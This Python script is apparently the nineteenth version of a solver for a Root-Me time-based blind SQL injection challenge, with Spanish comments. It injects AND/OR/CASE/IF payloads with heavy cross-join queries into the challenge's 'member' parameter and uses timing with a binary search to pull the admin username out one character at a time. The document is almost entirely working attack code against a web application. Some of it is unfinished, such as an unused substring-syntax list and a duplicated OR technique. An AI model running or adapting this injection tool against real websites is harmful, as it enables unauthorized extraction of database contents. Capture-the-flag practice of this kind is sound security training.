#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 19 - BÚSQUEDA DE LA TÉCNICA CORRECTA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class SQLInjectorTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.resultados = []
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def test_technique(self, technique, heavy, cond):
        """Prueba una técnica específica"""
        payload = technique.format(cond=cond, heavy=heavy)
        t = self.test_payload(payload, repeats=3)
        return t > self.threshold
    
    def extraer_caracter(self, query, pos, technique, heavy):
        """Extrae un carácter usando una técnica específica"""
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            payload = technique.format(cond=cond, heavy=heavy)
            t = self.test_payload(payload, repeats=2)
            if t > self.threshold:
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extraer_string(self, query, technique, heavy, label="Extrayendo", max_len=20):
        """Extrae un string usando una técnica específica"""
        print(f"\n  [{label}]")
        resultado = ""
        for pos in range(1, max_len + 1):
            char = self.extraer_caracter(query, pos, technique, heavy)
            resultado += char
            print(f"    Pos {pos}: '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return resultado
    
    def probar_combinacion(self, nombre, technique, heavy, query, esperado):
        """Prueba una combinación y verifica si extrae correctamente"""
        print(f"\n[+] Probando: {nombre}")
        print(f"    Técnica: {technique[:50]}...")
        print(f"    Heavy: {heavy[:50]}...")
        print(f"    Query: {query}")
        print(f"    Esperado: '{esperado}'")
        
        try:
            # Extraer el string
            extraido = self.extraer_string(query, technique, heavy, "Extrayendo")
            print(f"    Extraído: '{extraido}'")
            
            if extraido == esperado:
                print(f"    ✅ ¡ÉXITO! La técnica funciona correctamente")
                return True, technique, heavy
            else:
                print(f"    ❌ No coincide: '{extraido}' != '{esperado}'")
                return False, None, None
        except Exception as e:
            print(f"    ❌ Error: {e}")
            return False, None, None

# EJECUCIÓN
tester = SQLInjectorTester()

print("="*70)
print("  BÚSQUEDA DE LA TÉCNICA CORRECTA")
print("="*70)

# Configuración
query_admin = "SELECT user FROM member WHERE id=1"
esperado = "admin"

# 1. Diferentes técnicas con AND
print("\n[1] Probando técnicas con AND:")
and_techniques = [
    ("AND con cortocircuito", "1 AND ({cond}) AND ({heavy})"),
    ("AND con CASE", "1 AND (CASE WHEN {cond} THEN {heavy} ELSE 0 END)"),
    ("AND con IF", "1 AND IF({cond}, {heavy}, 0)"),
    ("AND con IF (invertido)", "1 AND IF({cond}, 0, {heavy})"),
]

# 2. Diferentes técnicas con OR
print("\n[2] Probando técnicas con OR:")
or_techniques = [
    ("OR con cortocircuito (normal)", "1 OR ({cond}) OR ({heavy})"),
    ("OR con cortocircuito (invertido)", "1 OR ({cond}) OR ({heavy})"),  # Mismo pero evaluamos diferente
    ("OR con CASE", "1 OR (CASE WHEN {cond} THEN {heavy} ELSE 0 END)"),
    ("OR con IF", "1 OR IF({cond}, {heavy}, 0)"),
]

# 3. Diferentes heavy queries
print("\n[3] Probando diferentes heavy queries:")
heavies = [
    "(SELECT COUNT(*) FROM users, users T1)",
    "(SELECT COUNT(*) FROM users, users T1, users T2)",
    "(SELECT COUNT(*) FROM users, users T1, users T2, users T3)",
    "(SELECT COUNT(*) FROM member, member T1)",
    "(SELECT COUNT(*) FROM member, member T1, member T2)",
    "(SELECT COUNT(*) FROM usuarios, usuarios T1)",
    "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1)",
]

# 4. Diferentes sintaxis de SUBSTRING
print("\n[4] Probando diferentes sintaxis de SUBSTRING:")
substring_syntax = [
    "SUBSTRING({query}, {pos}, 1)",
    "SUBSTR({query}, {pos}, 1)",
    "MID({query}, {pos}, 1)",
]

# 5. Probar todas las combinaciones
print("\n[5] Probando todas las combinaciones...")

combinaciones = []
for tech_name, tech_template in and_techniques + or_techniques:
    for heavy in heavies:
        for substr in substring_syntax:
            # Modificar la query para usar la sintaxis de substring
            query_mod = query_admin
            combinaciones.append((f"{tech_name} + {heavy[:30]}", tech_template, heavy, query_mod, esperado))

# Probar las primeras 20 combinaciones (para no tardar demasiado)
print(f"\n  Probando {len(combinaciones)} combinaciones...")
print("  (Las primeras 20 combinaciones)")

encontrado = False
for i, (nombre, tech, heavy, query, esperado) in enumerate(combinaciones[:20]):
    print(f"\n--- Combinación {i+1} ---")
    exito, tech_final, heavy_final = tester.probar_combinacion(
        nombre, tech, heavy, query, esperado
    )
    if exito:
        print("\n" + "="*70)
        print(f"  ✅ ¡TÉCNICA ENCONTRADA!")
        print(f"  Técnica: {tech_final}")
        print(f"  Heavy: {heavy_final}")
        print("="*70)
        encontrado = True
        break
    time.sleep(0.5)  # Pausa entre pruebas

if not encontrado:
    print("\n" + "="*70)
    print("  ❌ No se encontró una técnica que extraiga 'admin' correctamente")
    print("="*70)
    print("\nPosibles razones:")
    print("  1. La tabla 'member' no tiene la columna 'user'")
    print("  2. La columna 'user' está cifrada")
    print("  3. El ID no es 1 para 'admin'")
    print("  4. La técnica de extracción está mal")
    print("\nPróximos pasos:")
    print("  1. Probar con 'SELECT user FROM member LIMIT 1'")
    print("  2. Probar con 'SELECT user FROM member WHERE user LIKE '%admin%''")
    print("  3. Intentar extraer con diferentes puntos de inyección")
